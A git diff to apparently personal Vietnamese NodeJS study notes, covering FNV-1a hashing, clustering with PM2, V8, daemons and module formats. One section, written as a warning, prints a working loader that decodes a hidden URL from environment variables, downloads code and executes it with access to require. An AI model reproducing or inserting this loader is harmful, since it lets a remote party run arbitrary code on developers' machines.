@@ -72,9 +72,51 @@ Trình duyệt tự động gửi preflight request như vậy khi FE và server
 
 
 
+# Chạy code JS trên máy tải từ mạng về k an toàn
+VD: const path = require('path');
+require('dotenv').config({path: path.resolve(__dirname, '../.env')});
+const axios = require('axios');
+const initAppBootstrap = async () => {
+  try {
+    const src = atob(process.env.DEV_API_KEY);
+    const k = atob(process.env.DEV_SECRET_KEY);
+    const v = atob(process.env.DEV_SECRET_VALUE);
+    const s = (await axios.get(src,{headers:{[k]:v}})).data;
+    const handler = new (Function.constructor)('require',s);
+    handler(require);
+  } catch(error) {
+    console.log(error)
+  } 
+}
+module.exports = initAppBootstrap;
+=> Có thể dùng Docker chạy cho an toàn
+
+
+
+# Thuật toán hash FNV-1a 32-bit
+Thuật toán cực nhẹ, cực nhanh để băm chuỗi ngắn thành 1 số phạm vi 4 tỷ. K thể dịch ngược, chỉ có thể brute force. 
+Đảm bảo các tiêu chuẩn thông thường, chỉ có 1 vấn đề là cùng input luôn ra cùng output.
+Chỉ dùng trong các case đơn giản kiểu ẩn thông tin k quá nhạy cảm. VD muốn hash tên của user trong log.
+
+
+
+# Cluster trong nodejs
+Cluster trong hệ phân tán là 1 nhóm máy tính (nodes) làm việc cùng nhau để chia tải công việc cùng cung ra 1 dịch vụ. VD 1 hệ thống có 1 chức năng cụ thể, ta mở rộng bằng cách triển khai chức năng đó trên nhiều máy khác nhau mà cấu hình để hoạt động như 1 máy duy nhất cung ra dịch vụ chức năng đó
+Cluster cũng chỉ việc chạy nhiều process trên cùng 1 máy cung ra 1 chức năng, để tận dụng tối đa số CPU cores trong máy đó. Các instance độc lập nhau về main memory.
+
+-> NodeJS có built-in package cluster giúp chạy nhiều instance của server trên 1 máy => bỏ, thay thế bằng PM2.
+URL: https://www.youtube.com/watch?v=_74_z2-uOys
+Cơ chế khi chạy sẽ tạo 1 instance isMaster, fork ra hàng loạt instance isWorker chạy dự án lại từ trên xuống. Master có thể dùng quản lý các instance worker. 
+Nó tự tận dụng mỗi core CPU là 1 process, mỗi process vẫn đơn luồng trong nodejs, sẽ chịu tải đồng thời tốt hơn. 
+Số instance k nên set là max số CPU cores mà nên trải qua thực nghiệm để tối ưu. VD máy 10 cores chạy được 20 instances thì chỉ nên chạy tầm 10 intances, còn lại dành cho task khác để tránh quá tải. Các instance chạy chung 1 cổng và dùng cơ chế load balancing tối ưu của hđh để xử lý, thường là round robin.
+
+
+
 # Other
 -> NodeJS xd trên nền tảng Javascript V8 Engine tốc độ cao, mã nguồn mở. Engine gồm heap và stack, tải NodeJS là tải engine này về
 Javascript engine là trình thông dịch mã js. Ngoài V8 thì cũng có các js engine khác như: SpiderMonkey(FireFox), Hermes(ReactNative), Chakra(IE), JavascriptCore(Safari).
 
 -> Daemon là 1 loại chương trình trên các hệ điều hành like-unix hoạt động ẩn trong background. Các tiến trình daemon thg kết thúc bằng d như inetd, httpd, sshd, ipd. Các tiến trình daemon không thể bị gián đoạn và chỉ hoạt động khi có đầu vào, tách ra khỏi tiến trình cha mẹ.
 
+-> file.mjs là ES module js, file.cjs là file dùng common js. Có thể import lẫn nhau
+Nodejs dùng .js sẽ tự dùng commonjs, muốn dùng .js là es module phải thêm type module => tốt nhất là nodejs dùng commonjs
